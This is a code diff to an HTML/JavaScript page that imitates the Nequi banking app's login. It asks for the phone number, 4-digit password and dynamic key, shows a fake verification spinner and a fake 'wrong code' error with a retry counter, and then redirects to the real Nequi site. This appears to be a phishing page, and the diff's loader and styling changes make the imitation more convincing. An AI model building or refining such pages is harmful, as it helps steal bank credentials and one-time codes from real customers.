@@ -152,15 +152,48 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
+    /* ==================== LOADER MEJORADO ==================== */
+    #loader {
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    .spinner-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+
     .spinner {
-      width: 55px; height: 55px;
-      border: 6px solid rgba(255,45,149,0.2);
-      border-top: 6px solid #FF2D95;
+      width: 65px;
+      height: 65px;
+      border: 5px solid rgba(255, 45, 149, 0.15);
+      border-top: 5px solid #FF2D95;
       border-radius: 50%;
-      animation: spin 1.2s linear infinite;
+      animation: spin 1s linear infinite;
       margin-bottom: 25px;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loader-text {
+      font-size: 17px;
+      color: #E0B0FF;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+
+    .nequi-icon {
+      margin-top: 40px;
+      opacity: 0.15;
+      font-size: 80px;
+    }
 
     .error-text {
       color: #FF4D4D;
@@ -174,7 +207,7 @@
 
   <div class="phone-frame">
 
-    <!-- Pantalla 1 -->
+    <!-- Pantalla 1, 2 y 3 se mantienen igual (las dejo resumidas) -->
     <div class="screen" id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
@@ -185,7 +218,6 @@
       <button onclick="goToPassword()">Entra</button>
     </div>
 
-    <!-- Pantalla 2 - Clave 4 dígitos -->
     <div class="screen" id="screen2">
       <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
@@ -209,7 +241,6 @@
       </div>
     </div>
 
-    <!-- Pantalla 3 - Clave Dinámica -->
     <div class="screen" id="screen3">
       <div class="back" onclick="goBack(2)">←</div>
       <div class="title">Clave Dinámica</div>
@@ -234,18 +265,21 @@
       </div>
     </div>
 
-    <!-- Loader (6 segundos) -->
+    <!-- Loader Mejorado y Centrado -->
     <div class="screen" id="loader">
-      <div class="spinner"></div>
-      <div style="text-align:center; font-size:18px;">Verificando clave dinámica...</div>
+      <div class="spinner-container">
+        <div class="spinner"></div>
+        <div class="loader-text">Verificando clave dinámica...</div>
+      </div>
+      <div class="nequi-icon">■</div>
     </div>
 
-    <!-- Pantalla de Error -->
+    <!-- Error Screen -->
     <div class="screen" id="errorScreen">
       <div class="error-text">Clave dinámica errada</div>
       <div class="message">El código ingresado no es correcto.<br>Por favor intenta nuevamente.</div>
-      <button onclick="retryDynamic()" style="margin-top:50px;">Intentar de nuevo</button>
-      <div style="margin-top:40px; color:#FF88B5; font-size:16px;" id="attemptsText">Intentos restantes: 3</div>
+      <button onclick="retryDynamic()" style="margin-top:60px;">Intentar de nuevo</button>
+      <div style="margin-top:45px; color:#FF88B5; font-size:16px;" id="attemptsText">Intentos restantes: 3</div>
     </div>
 
   </div>
@@ -310,7 +344,6 @@
 
       showScreen('loader');
 
-      // Loader de 6 segundos (entre 5 y 8)
       setTimeout(() => {
         if (currentLength === 4) {
           showScreen('screen3');
@@ -323,7 +356,7 @@
             window.location.href = "https://www.nequi.com.co";
           }
         }
-      }, 6000);
+      }, 6000); // 6 segundos
     }
 
     function retryDynamic() {
